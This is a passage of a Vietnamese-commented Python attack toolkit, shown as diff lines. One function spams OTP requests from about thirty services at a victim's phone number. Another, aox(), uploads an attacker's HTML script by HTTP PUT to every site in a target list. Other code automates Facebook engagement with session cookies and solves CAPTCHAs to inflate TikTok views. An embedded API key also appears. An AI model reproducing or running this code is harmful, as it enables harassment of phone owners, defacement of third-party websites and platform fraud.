+    # 'accept-encoding': 'gzip, deflate, br',
+    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+    # 'cookie': '_gcl_au=1.1.1060296146.1691285262; _gid=GA1.2.497444655.1691285263; _ga_YNVPPJ8MZP=GS1.1.1691285263.1.0.1691285263.60.0.0; _ga=GA1.1.1816034013.1691285263; _ga_8956TVT2M3=GS1.1.1691285264.1.0.1691285264.60.0.0; _ga_CDD1S5P7D4=GS1.1.1691285264.1.0.1691285264.60.0.0; _ga_GECRBQV6JK=GS1.1.1691285264.1.0.1691285264.60.0.0; _ga_Y9YZPDEGP0=GS1.1.1691285265.1.0.1691285265.60.0.0; start_time=08/06/2023 8:27:45; source=https://www.sapo.vn/blog/mat-hang-kinh-doanh-hot-nhat-hien-nay; _ga_X10JR147Y7=GS1.1.1691285264.1.0.1691285265.59.0.0; _fbp=fb.1.1691285267174.309606627; _ga_EBZKH8C7MK=GS1.2.1691285267.1.0.1691285267.0.0.0; referral=https://www.google.com/; landing_page=https://www.sapo.vn/blog/mat-hang-kinh-doanh-hot-nhat-hien-nay; pageview=1; _ga_8Z6MB85ZM2=GS1.1.1691285265.1.1.1691285333.60.0.0',
+    }
+  data = {
+    'phonenumber': f'{sdt}',
+  }
+  response = requests.post('https://www.sapo.vn/fnb/sendotp', headers=headers, data=data).json()
+
+
+def xoa(text):
+    sys.stdout.write('\r' + text)
+    sys.stdout.flush()
+# hàm chạy
+def idelay(o):
+    while(o>0):
+        o=o-1
+        print(f"[\033[1;33mV\033[1;34mu\033[1;35mi \033[1;32mL\033[1;33mò\033[1;34mn\033[1;35mg \033[1;36mC\033[1;33mh\033[1;34mờ[\033[1;35m.....""]""["+str(o)+"]""    ",end='\r')
+        time.sleep(1/6)
+        print(f"[\033[1;31mV\033[1;32mu\033[1;33mi \033[1;34mL\033[1;35mò\033[1;31mn\033[1;32mg \033[1;33mC\033[1;32mh\033[1;35mờ[\033[1;33m•....""]""["+str(o)+"]""     ",end='\r')
+        time.sleep(1/6)
+        print(f"[\033[1;32mV\033[1;33mu\033[1;34mi \033[1;35mL\033[1;36mò\033[1;33mn\033[1;34mg \033[1;35mC\033[1;31mh\033[1;32mờ[\033[1;35m••...""]""["+str(o)+"]""     ",end='\r')
+        time.sleep(1/6)
+        print(f"[\033[1;31mV\033[1;33mu\033[1;35mi \033[1;33mL\033[1;31mò\033[1;32mn\033[1;34mg \033[1;36mC\033[1;35mh\033[1;31mờ[\033[1;32m•••..""]""["+str(o)+"]""     ",end='\r')
+        time.sleep(1/6)
+        print(f"[\033[1;32mV\033[1;34mu\033[1;36mi \033[1;32mL\033[1;34mò\033[1;31mn\033[1;35mg \033[1;33mC\033[1;36mh\033[1;35mờ[\033[1;38m••••.""]""["+str(o)+"]""     ",end='\r')
+        time.sleep(1/6)
+        print(f"[\033[1;31mV\033[1;34mu\033[1;36mi \033[1;32mL\033[1;34mò\033[1;32mn\033[1;35mg \033[1;36mC\033[1;34mh\033[1;32mờ[\033[1;33m•••••""]""["+str(o)+"]""     ",end='\r')
+        time.sleep(1/6)
+
+
+
+def run(sdt,i):
+  threading1.submit(sapo,sdt)
+  threading1.submit(onecredit,sdt)
+  time.sleep(0.1)
+  threading1.submit(y360,sdt)
+  threading1.submit(tv360,sdt)
+  time.sleep(0.1)
+  threading1.submit(winmart,sdt)
+  threading1.submit(apispam,sdt)
+  time.sleep(0.1)
+  threading1.submit(vieon,sdt)
+  threading1.submit(poyeye,sdt)
+  time.sleep(0.1)
+  threading1.submit(alfrescos,sdt)
+  threading1.submit(fpt,sdt)
+  time.sleep(0.1)
+  threading1.submit(kiot,sdt) # ok
+  threading1.submit(vayvnd,sdt)
+  time.sleep(0.1)
+  threading1.submit(viettel,sdt)
+  threading1.submit(tamo,sdt)
+  time.sleep(0.1)
+  threading1.submit(meta,sdt)
+  threading1.submit(funring,sdt)
+  time.sleep(0.1)
+  threading1.submit(dkvt,sdt)
+  threading1.submit(fptplay,sdt)
+  time.sleep(0.1)
+  threading1.submit(vietid,sdt)
+  threading1.submit(phamacy,sdt)
+  time.sleep(0.1)
+  threading1.submit(y360rs,sdt)
+  threading1.submit(concung,sdt)
+  time.sleep(0.1)
+  threading1.submit(appota,sdt)
+  threading1.submit(pizzacompany,sdt)
+  time.sleep(0.1)
+  threading1.submit(best_inc,sdt)
+  threading1.submit(shopiness,sdt)
+  time.sleep(0.1)
+  threading1.submit(ghn,sdt)
+  threading1.submit(chotot,sdt)
+  time.sleep(0.1)
+  threading1.submit(cashbar,sdt)
+  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
+  idelay(8)
+  time.sleep(1)
+#=========================================================================================================================================================
+#==================================================================================================================================================================
+def check_put_method(url):
+    try:
+        response = requests.request('PUT', url)
+        if response.status_code == 200:
+            print(f"{xanh_la}Website \033[4m{url} có hỗ trợ PUT")
+        else:
+            print(f"{do}Website \033[4m{url} không hỗ trợ PUT")
+    except requests.exceptions.RequestException as e:
+        print(f"Lỗi: {url}: {e}")
+#===================================================================================================================================================================
+
+#==================================================================================================================================================================
+headers = {
+    'authority': 'traodoisub.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
+    'user-agent': 'traodoisub tiktok tool',
+}
+class ApiPro5:
+    
+    def __init__(self, cookies,fb_dtsg,jazoet,id_page) -> None:
+        self.headers = {
+                'authority': 'www.facebook.com',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                'accept-language': 'vi',
+                'cookie': cookies,
+                'sec-ch-prefers-color-scheme': 'light',
+                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'none',
+                'sec-fetch-user': '?1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
+                'viewport-width': '1366',
+            }
+        url_profile = requests.get('https://www.facebook.com/me', headers=self.headers).url
+        profile = requests.get(url_profile, headers=self.headers).text
+        self.fb_dtsg = fb_dtsg
+        self.jazoet = jazoet
+        self.user_id = id_page
+    def join(self, group_id):
+        data = {
+            'fb_dtsg': self.fb_dtsg,
+            'jazoest': self.jazoet,
+            'fb_api_caller_class': 'RelayModern',
+            'fb_api_req_friendly_name': 'GroupCometJoinForumMutation',
+            'variables': '{"feedType":"DISCUSSION","groupID":"'+group_id+'","imageMediaType":"image/x-auto","input":{"action_source":"GROUPS_ENGAGE_TAB","attribution_id_v2":"GroupsCometCrossGroupFeedRoot.react,comet.groups.feed,tap_tabbar,1667116100089,433821,2361831622,","group_id":"'+group_id+'","group_share_tracking_params":null,"actor_id":"'+self.user_id+'","client_mutation_id":"2"},"inviteShortLinkKey":null,"isChainingRecommendationUnit":false,"isEntityMenu":false,"scale":1,"source":"GROUPS_ENGAGE_TAB","renderLocation":"group_mall","__relay_internal__pv__GlobalPanelEnabledrelayprovider":false,"__relay_internal__pv__GroupsCometEntityMenuEmbeddedrelayprovider":true}',
+            'server_timestamps': 'true',
+            'doc_id': '5915153095183264',
+        }
+
+        response = requests.post('https://www.facebook.com/api/graphql/', headers=self.headers, data=data).text
+        return response 
+    def subscribe(self, uid):
+        data = {
+            'fb_dtsg': self.fb_dtsg,
+            'jazoest': self.jazoet,
+            'fb_api_caller_class': 'RelayModern',
+            'fb_api_req_friendly_name': 'CometUserFollowMutation',
+            'variables': '{"input":{"attribution_id_v2":"ProfileCometTimelineListViewRoot.react,comet.profile.timeline.list,via_cold_start,1667114418950,431532,190055527696468,","subscribe_location":"PROFILE","subscribee_id":"'+uid+'","actor_id":"'+self.user_id+'","client_mutation_id":"1"},"scale":1}',
+            'server_timestamps': 'true',
+            'doc_id': '5032256523527306',
+        }
+        subscribe = requests.post('https://www.facebook.com/api/graphql/', headers=self.headers, data=data).text
+        return subscribe
+    def reaction(self, id_post, reaction):
+        try:
+            url = requests.get('https://www.facebook.com/'+id_post, headers=self.headers).url
+            home = requests.get(url, headers=self.headers).text
+            feedback_id = home.split('{"__typename":"CommentComposerLiveTypingBroadcastPlugin","feedback_id":"')[1].split('","')[0]
+            data = {
+                'fb_dtsg': self.fb_dtsg,
+                'jazoest': self.jazoet,
+                'fb_api_caller_class': 'RelayModern',
+                'fb_api_req_friendly_name': 'CometUFIFeedbackReactMutation',
+                'variables': '{"input":{"attribution_id_v2":"ProfileCometTimelineListViewRoot.react,comet.profile.timeline.list,via_cold_start,1667106623951,429237,190055527696468,","feedback_id":"'+feedback_id+'","feedback_reaction_id":"'+reaction+'","feedback_source":"PROFILE","is_tracking_encrypted":true,"tracking":["AZXg8_yM_zhwrTY7oSTw1K93G-sycXrSreRnRk66aBJ9mWkbSuyIgNqL0zHEY_XgxepV1XWYkuv2C5PuM14WXUB9NGsSO8pPe8qDZbqCw5FLQlsGTnh5w9IyC_JmDiRKOVh4gWEJKaTdTOYlGT7k5vUcSrvUk7lJ-DXs3YZsw994NV2tRrv_zq1SuYfVKqDboaAFSD0a9FKPiFbJLSfhJbi6ti2CaCYLBWc_UgRsK1iRcLTZQhV3QLYfYOLxcKw4s2b1GeSr-JWpxu1acVX_G8d_lGbvkYimd3_kdh1waZzVW333356_JAEiUMU_nmg7gd7RxDv72EkiAxPM6BA-ClqDcJ_krJ_Cg-qdhGiPa_oFTkGMzSh8VnMaeMPmLh6lULnJwvpJL_4E3PBTHk3tIcMXbSPo05m4q_Xn9ijOuB5-KB5_9ftPLc3RS3C24_7Z2bg4DfhaM4fHYC1sg3oFFsRfPVf-0k27EDJM0HZ5tszMHQ"],"session_id":"'+str(uuid.uuid4())+'","actor_id":"'+self.user_id+'","client_mutation_id":"1"},"useDefaultActor":false,"scale":1}',
+                'server_timestamps': 'true',
+                'doc_id': '5703418209680126',
+            }
+
+            reaction = requests.post('https://www.facebook.com/api/graphql/', headers=self.headers, data=data).text
+            return {'status': True, 'url': url}
+        except:
+            return {'status': False, 'url': url}
+    
+def get_page(cookie):
+    headers = {
+        'authority': 'mbasic.facebook.com',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+        'accept-language': 'vi,en;q=0.9,vi-VN;q=0.8,fr-FR;q=0.7,fr;q=0.6,en-US;q=0.5',
+        'cache-control': 'max-age=0',
+        'cookie': cookie,
+        'origin': 'https://www.facebook.com',
+        'referer': 'https://www.facebook.com',
+        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'none',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+    }
+    response = requests.get('https://mbasic.facebook.com/',headers=headers).text
+    fb_dtsg = response.split('<input type="hidden" name="fb_dtsg" value="')[1].split('"')[0]
+    jazoest = response.split('<input type="hidden" name="jazoest" value="')[1].split('"')[0]
+    idpef = requests.post('https://www.facebook.com/api/graphql/', headers=headers, data={'fb_dtsg': fb_dtsg,'jazoest': jazoest,'variables': '{"showUpdatedLaunchpointRedesign":true,"useAdminedPagesForActingAccount":false,"useNewPagesYouManage":true}','doc_id': '5300338636681652'}).json()
+    a = idpef['data']['viewer']['actor']['profile_switcher_eligible_profiles']['nodes']
+    sl = 0
+    for b in a:
+        sl +=1
+        uid = b['profile']['id']
+        name = b['profile']['name']
+        delegate_page_id = b['profile']['delegate_page_id']
+        print (f" PAGE : {sl} | ID : {uid} | Name : {name} ")
+    return a
+def get_data(cookie):
+    headers = {
+        'authority': 'mbasic.facebook.com',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+        'accept-language': 'en-US,en;q=0.9',
+        'cache-control': 'max-age=0',
+        'cookie': cookie,
+        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'none',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+    }
+
+    response = requests.get('https://mbasic.facebook.com/',headers=headers).text
+    fb_dtsg = response.split('<input type="hidden" name="fb_dtsg" value="')[1].split('"')[0]
+    jazoet = response.split('<input type="hidden" name="jazoest" value="')[1].split('"')[0]
+    return json.dumps({'fb_dtsg':fb_dtsg,'jazoet':jazoet})
+
+def login_tds(token):
+    try:
+        r = requests.get('https://traodoisub.com/api/?fields=profile&access_token='+token, headers=headers, timeout=5).json()
+        if 'success' in r:
+            
+            print(f" Đăng nhập thành công!\n User: {r['data']['user']} | Xu hiện tại: {r['data']['xu']}")
+            return r
+        else:
+            print(" Token TDS không hợp lệ, hãy kiểm tra lại!\n")
+            return 'error_token'
+    except:
+        return 'error'
+
+def load_job(type, TDS_token):
+        r = requests.get(f'https://traodoisub.com/api/?fields={type}&access_token={TDS_token}')
+
+
+def type_cx(type_1) :
+    if type_1 == "LOVE" :
+        type_2 = '1678524932434102'
+    elif type_1 == "CARE" :
+        type_2 = '613557422527858'
+    elif type_1 == "WOW" :
+        type_2 = '478547315650144'
+    elif type_1 == "HAHA" :
+        type_2 = '115940658764963'
+    elif type_1 == "SAD" :
+        type_2 = '908563459236466'
+    elif type_1 == "ANGRY" :
+        type_2 = '444813342392137'
+        
+    return type_2
+def cau_hinh(id, TDS_token, name):
+    urlch = f"https://traodoisub.com/api/?fields=run&id={id}&access_token={TDS_token}'"
+    ch = requests.get( url=urlch)
+    try: 
+        checkch = ch.json()["data"]["msg"]
+        print(f" Cấu Hình | ID : {id} | Name : {name} ")
+    except:
+        print(f" Cấu Hình Thất Bại {id} ")
+        exit ()
+
+def chon_job(so,chon):
+    if chon == 1 :
+        if so == 4 :
+            so -= 4 
+        else :
+            type = ['like','likegiare','likesieure','reaction']
+            job = type[so]
+    elif chon == 2 :
+        job = "group"
+    elif chon == 3 :
+        job = "follow"
+    elif chon == 4:
+        if so == 5 :
+            so -= 5 
+        else :
+            type = ['like','likegiare','likesieure','reaction','group']
+            job = type[so]
+    else :
+        if so == 6 :
+            so -= 6 
+        else :
+            type = ['like','likegiare','likesieure','reaction','group','follow']
+            
+            job = type[so]
+    return job
+
+
+
+#===================================================================================================================================================================
+
+#==============================================================================================================================================================================
+
+
+b = '\033[31m'
+h = '\033[32m'
+m = '\033[00m'
+
+def aox(script,target_file="listsite.txt"):
+   op = open(script,"r").read()
+   with open(target_file, "r") as target:
+      target = target.readlines()
+      s = requests.Session()
+      print("\033[92mAttacking to %d Website."%(len(target)))
+      for web in target:
+         try:
+            site = web.strip()
+            if site.startswith("http://") is False:
+               site = "http://" + site
+            req = s.put(site+"/"+script,data=op)
+            if req.status_code == 200 and requests.get(f"{site}/{script}").text == open(script, "r").read():
+               print(m+"\033[0m ["+h+" DONE"+m+" ] %s/%s"%(site,script))
+            else:
+               print(m+"\033[0m ["+b+" FAILED!"+m+" ] %s/%s"%(site,script))
+
+         except requests.exceptions.RequestException:
+            continue
+         except KeyboardInterrupt:
+            print; exit()
+
+def main(__bn__):
+   clear()
+   runbanner(__bn__)
+   while True:
+      try:
+         a = input(f"{dac_biet}Vui Lòng điền file html chứa script của bạn (VD:index.html):{vang} ")
+         if not os.path.isfile(a):
+            print("file '%s' not found"%(a))
+            continue
+         else:
+            break
+      except KeyboardInterrupt:
+         print; exit()
+
+   aox(a)
+#==============================================================================================================================================================================
+
+#==============================================================================================================================================================================
+import threading
+class Zefoy:
+	# if os.path.exists('config.json') is False: open('config.json','w',encoding='utf-8',errors='ignore').write(json.dumps({'url':'https://www.tiktok.com/t/ZTRToxYct','service':'Views'},indent=4))
+
+	def __init__(self):
+		self.base_url = 'https://zefoy.com/'
+		self.headers = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'}
+		self.session = requests.Session()
+		self.captcha_1 = None
+		self.captcha_ = {}
+		self.service = 'Views'
+		self.video_key = None
+		self.services = {}
+		self.services_ids = {}
+		self.services_status = {}
+		self.url = 'None'
+		self.text = 'ka'
+		url1= input(f"{dac_biet}Nhập link video: {vang}")
+		self.url=url1
+
+	def get_captcha(self):
+		if os.path.exists('session'): self.session.cookies.set("PHPSESSID", open('session',encoding='utf-8').read(), domain='zefoy.com')
+		request = self.session.get(self.base_url, headers=self.headers)
+		if 'Enter Video URL' in request.text: self.video_key = request.text.split('" placeholder="Enter Video URL"')[0].split('name="')[-1]; return True
+
+		try:
+			for x in re.findall(r'<input type="hidden" name="(.*)" value="(.*)">', request.text): self.captcha_[x[0]] = x[1]
+
+			self.captcha_1 = request.text.split('type="text" name="')[1].split('" oninput="this.value=this.value.toLowerCase()"')[0]
+			captcha_url = request.text.split('<img src="')[1].split('" onerror="imgOnError()" class="')[0]
+			request = self.session.get(f"{self.base_url}{captcha_url}",headers=self.headers)
+			open('captcha.png', 'wb').write(request.content)
+			print(f'{tim}Đang giải capcha..')
+			return False
+		except Exception as e:
+			print(f"{do}Không thể giải captcha: {e}")
+			time.sleep(2)
+			self.get_captcha()
+
+	def send_captcha(self, new_session = False):
+		if new_session: self.session = requests.Session(); os.remove('session'); time.sleep(2)
+		if self.get_captcha(): print(f'{xanh_la}Đang kêt nối đến session');return (True, 'The session already exists')
+		captcha_solve = self.solve_captcha('captcha.png')[1]
+		self.captcha_[self.captcha_1] = captcha_solve
+		request = self.session.post(self.base_url, headers=self.headers, data=self.captcha_)
+
+		if 'Enter Video URL' in request.text: 
+			print(f'{xanh_la}Session đã được tạo')
+			open('session','w',encoding='utf-8').write(self.session.cookies.get('PHPSESSID'))
+			print(f"{xanh_la}Giải capcha thành công: {captcha_solve}")
+			self.video_key = request.text.split('" placeholder="Enter Video URL"')[0].split('name="')[-1]
+			return (True,captcha_solve)
+		else: return (False,captcha_solve)
+
+	def solve_captcha(self, path_to_file = None, b64 = None, delete_tag = ['\n','\r']):
+		if path_to_file: task = path_to_file
+		else: open('temp.png','wb').write(base64.b64decode(b64)); task = 'temp.png'
+		request = self.session.post('https://api.ocr.space/parse/image?K87899142388957', headers={'apikey':'K87899142388957'}, files={'task':open(task,'rb')}).json()
+		solved_text = request['ParsedResults'][0]['ParsedText']
+		for x in delete_tag: solved_text = solved_text.replace(x,'')
+		return (True, solved_text)
+
+	def get_status_services(self):
+		request = self.session.get(self.base_url, headers=self.headers).text
+		for x in re.findall(r'<h5 class="card-title">.+</h5>\n.+\n.+', request): self.services[x.split('<h5 class="card-title">')[1].split('<')[0].strip()] = x.split('d-sm-inline-block">')[1].split('</small>')[0].strip()
+		for x in re.findall(r'<h5 class="card-title mb-3">.+</h5>\n<form action=".+">', request): self.services_ids[x.split('title mb-3">')[1].split('<')[0].strip()] = x.split('<form action="')[1].split('">')[0].strip()
+		for x in re.findall(r'<h5 class="card-title">.+</h5>\n.+<button .+', request): self.services_status[x.split('<h5 class="card-title">')[1].split('<')[0].strip()] = False if 'disabled class' in x else True
+		return (self.services, self.services_status)
+
+	def get_table(self, i = 1):
+		table = PrettyTable(field_names=["ID", "DỊCH VỤ", "Status"], title="Status Services", header_style="upper",border=True)
+		while True:
+			if len(self.get_status_services()[0])>1:break
+			else:print('Cant get services, retrying...');self.send_captcha();time.sleep(2)
+		for service in self.services: table.add_row([f"{Fore.CYAN}{i}{Fore.RESET}", service, f"{Fore.GREEN if 'ago updated' in self.services[service] else Fore.RED}{self.services[service]}{Fore.RESET}"]); i+=1
+		table.title =  f"{Fore.YELLOW}Số Dịch Vụ Hoạt Động: {len([x for x in self.services_status if self.services_status[x]])}{Fore.RESET}"
+		print(table)
+
+	def find_video(self):
+		if self.service is None: return (False, "You didn't choose the service")
+		while True:
+			if self.service not in self.services_ids: self.get_status_services(); time.sleep(1)
+			request = self.session.post(f'{self.base_url}{self.services_ids[self.service]}', headers={'content-type':'multipart/form-data; boundary=----WebKitFormBoundary0nU8PjANC8BhQgjZ', 'user-agent':self.headers['user-agent'], 'origin':'https://zefoy.com'}, data=f'------WebKitFormBoundary0nU8PjANC8BhQgjZ\r\nContent-Disposition: form-data; name="{self.video_key}"\r\n\r\n{self.url}\r\n------WebKitFormBoundary0nU8PjANC8BhQgjZ--\r\n')
+			try: self.video_info = base64.b64decode(unquote(request.text.encode()[::-1])).decode()
+			except: time.sleep(3); continue
+			if 'Session expired. Please re-login' in self.video_info: print(f'{do}Phiên hết hạn. Đang đăng nhập lại...');self.send_captcha(); return
+			elif 'service is currently not working' in self.video_info: return (True,'Dịch vụ hiện không hoạt động, hãy thử lại sau. | Bạn có thể thay đổi nó trong cấu hình.')
+			elif """onsubmit="showHideElements""" in self.video_info:
+				self.video_info = [self.video_info.split('" name="')[1].split('"')[0],self.video_info.split('value="')[1].split('"')[0]]
+				return (True, request.text)
+			elif 'Checking Timer...' in self.video_info:
+				try: 
+					t=int(re.findall(r'ltm=(\d*);', self.video_info)[0])
+					lamtilo = int(re.findall(r'ltm=(\d*);', self.video_info)[0])
+				except: 
+					return (False,)
+				if lamtilo==0:self.find_video()
+				elif lamtilo >= 1000: print(f'{do}Your IP was banned')
+				_=time.time()
+				while time.time()-2<_+lamtilo:
+					t-=1
+					print("Vui lòng chờ: {0} ".format(t)+"giây .", end="\r")
+					time.sleep(1)
+					
+				continue
+			elif 'Too many requests. Please slow' in self.video_info: time.sleep(3)
+			else: print(self.video_info)
+
+	def use_service(self):
+		if self.find_video()[0] is False: return False
+		self.token = "".join(random.choices(ascii_letters+digits, k=16))
+		request = self.session.post(f'{self.base_url}{self.services_ids[self.service]}', headers={'content-type':f'multipart/form-data; boundary=----WebKitFormBoundary{self.token}', 'user-agent':self.headers['user-agent'], 'origin':'https://zefoy.com'}, data=f'------WebKitFormBoundary{self.token}\r\nContent-Disposition: form-data; name="{self.video_info[0]}"\r\n\r\n{self.video_info[1]}\r\n------WebKitFormBoundary{self.token}--\r\n')
+		try: res = base64.b64decode(unquote(request.text.encode()[::-1])).decode()
+		except: time.sleep(3); return ""
+		if 'Session expired. Please re-login' in res: print(f'{do}Phiên hết hạn. Đang đăng nhập lại...');self.send_captcha(); return ""
+		elif 'Too many requests. Please slow' in res: time.sleep(3)
+		elif 'service is currently not working' in res: return ('Dịch vụ hiện không hoạt động, hãy thử lại sau. | Bạn có thể thay đổi nó trong cấu hình.')
+		else: print(res.split("sans-serif;text-align:center;color:green;'>")[1].split("</")[0])
+
+	def get_video_info(self):
+		request = self.session.get(f'https://tiktok.livecounts.io/video/stats/{urlparse(self.url).path.rpartition("/")[2]}',headers={'authority':'tiktok.livecounts.io','origin':'https://livecounts.io','user-agent':self.headers['user-agent']}).json()
+		if 'viewCount' in request: return request
+		else: return {'viewCount':0, 'likeCount':0,'commentCount':0,'shareCount':0}
+
+	def get_video_id(self, url_ = None, set_url=True):
+		if url_ is None: url_ = self.url
+		if url_[-1] == '/': url_=url_[:-1]
+		url = urlparse(url_).path.rpartition('/')[2]
+		if url.isdigit(): self.url = url_; return url_
+		request = requests.get(f'https://api.tokcount.com/?type=videoID&username=https://vm.tiktok.com/{url}',headers={'origin': 'https://tokcount.com','authority': 'api.tokcount.com','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'})
+		if request.text == '': print(f'{do}Link video không hợp lệ'); return False
+		else: json_=request.json()
+		if 'author' not in json_: print(f'{do}{self.url}| Link video không hợp lệ'); return False
+		if set_url: self.url = f'https://www.tiktok.com/@{json_["author"]}/video/{json_["id"]}';print(f'Formated video url --> {self.url}')
+		return request.text
+
+	def check_config(self):
+		
+		while True:
+			try: 
+				last_url = self.url
+				if last_url != self.url: self.get_video_id()
+			except Exception as e: print(e)
+			time.sleep(4)
+	def update_name(self):
+		while True:
+			try:
+				ctypes.windll.kernel32.SetConsoleTitleA(self.text.encode())
+				video_info = self.get_video_info()
+				self.text = f"{xanh_la}Views: {video_info['viewCount']} "
+			except: pass
+			time.sleep(5)
+
+#==============================================================================================================================================================================
+#==========================================================================================================================================================================================
+class Zefoy2:
+	# if os.path.exists('config.json') is False: open('config.json','w',encoding='utf-8',errors='ignore').write(json.dumps({'url':'https://www.tiktok.com/t/ZTRToxYct','service':'Hearts'},indent=4))
+
+	def __init__(self):
+		self.base_url = 'https://zefoy.com/'
+		self.headers = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'}
+		self.session = requests.Session()
+		self.captcha_1 = None
+		self.captcha_ = {}
+		self.service = 'Hearts'
+		self.video_key = None
+		self.services = {}
+		self.services_ids = {}
+		self.services_status = {}
+		self.url = 'None'
+		url1=input(f"{dac_biet}Nhập link video: {vang}")
+		self.url=url1
+
+	def get_captcha2(self):
+		if os.path.exists('session'): self.session.cookies.set("PHPSESSID", open('session',encoding='utf-8').read(), domain='zefoy.com')
+		request = self.session.get(self.base_url, headers=self.headers)
+		if 'Enter Video URL' in request.text: self.video_key = request.text.split('" placeholder="Enter Video URL"')[0].split('name="')[-1]; return True
+
+		try:
+			for x in re.findall(r'<input type="hidden" name="(.*)" value="(.*)">', request.text): self.captcha_[x[0]] = x[1]
+
+			self.captcha_1 = request.text.split('type="text" name="')[1].split('" oninput="this.value=this.value.toLowerCase()"')[0]
+			captcha_url = request.text.split('<img src="')[1].split('" onerror="imgOnError()" class="')[0]
+			request = self.session.get(f"{self.base_url}{captcha_url}",headers=self.headers)
+			open('captcha.png', 'wb').write(request.content)
+			print(f'{tim}Đang giải capcha..')
+			return False
+		except Exception as e:
+			print(f"{do}Không thể giải captcha: {e}")
+			time.sleep(2)
+			self.get_captcha2()
+
+	def send_captcha2(self, new_session = False):
+		if new_session: self.session = requests.Session(); os.remove('session'); time.sleep(2)
+		if self.get_captcha2(): print(f'{xanh_la}Đang kêt nối đến session');return (True, 'The session already exists')
+		captcha_solve = self.solve_captcha('captcha.png')[1]
+		self.captcha_[self.captcha_1] = captcha_solve
+		request = self.session.post(self.base_url, headers=self.headers, data=self.captcha_)
+
+		if 'Enter Video URL' in request.text: 
+			print(f'{xanh_la}Session đã được tạo')
+			open('session','w',encoding='utf-8').write(self.session.cookies.get('PHPSESSID'))
+			print(f"{xanh_la}Giải capcha thành công: {captcha_solve}")
+			self.video_key = request.text.split('" placeholder="Enter Video URL"')[0].split('name="')[-1]
+			return (True,captcha_solve)
+		else: return (False,captcha_solve)
+
+	def solve_captcha2(self, path_to_file = None, b64 = None, delete_tag = ['\n','\r']):
+		if path_to_file: task = path_to_file
+		else: open('temp.png','wb').write(base64.b64decode(b64)); task = 'temp.png'
+		request = self.session.post('https://api.ocr.space/parse/image?K87899142388957', headers={'apikey':'K87899142388957'}, files={'task':open(task,'rb')}).json()
+		solved_text = request['ParsedResults'][0]['ParsedText']
+		for x in delete_tag: solved_text = solved_text.replace(x,'')
+		return (True, solved_text)
+
+	def get_status_services2(self):
+		request = self.session.get(self.base_url, headers=self.headers).text
+		for x in re.findall(r'<h5 class="card-title">.+</h5>\n.+\n.+', request): self.services[x.split('<h5 class="card-title">')[1].split('<')[0].strip()] = x.split('d-sm-inline-block">')[1].split('</small>')[0].strip()
+		for x in re.findall(r'<h5 class="card-title mb-3">.+</h5>\n<form action=".+">', request): self.services_ids[x.split('title mb-3">')[1].split('<')[0].strip()] = x.split('<form action="')[1].split('">')[0].strip()
+		for x in re.findall(r'<h5 class="card-title">.+</h5>\n.+<button .+', request): self.services_status[x.split('<h5 class="card-title">')[1].split('<')[0].strip()] = False if 'disabled class' in x else True
+		return (self.services, self.services_status)
+
+	def find_video2(self):
+		if self.service is None: return (False, "You didn't choose the service")
+		while True:
+			if self.service not in self.services_ids: self.get_status_services(); time.sleep(1)
+			request = self.session.post(f'{self.base_url}{self.services_ids[self.service]}', headers={'content-type':'multipart/form-data; boundary=----WebKitFormBoundary0nU8PjANC8BhQgjZ', 'user-agent':self.headers['user-agent'], 'origin':'https://zefoy.com'}, data=f'------WebKitFormBoundary0nU8PjANC8BhQgjZ\r\nContent-Disposition: form-data; name="{self.video_key}"\r\n\r\n{self.url}\r\n------WebKitFormBoundary0nU8PjANC8BhQgjZ--\r\n')
+			try: self.video_info = base64.b64decode(unquote(request.text.encode()[::-1])).decode()
+			except: time.sleep(3); continue
+			if 'Session expired. Please re-login' in self.video_info: print(f'{do}Phiên hết hạn. Đang đăng nhập lại...');self.send_captcha2(); return
+			elif 'service is currently not working' in self.video_info: return (True,'Dịch vụ hiện không hoạt động, hãy thử lại sau. | Bạn có thể thay đổi nó trong cấu hình.')
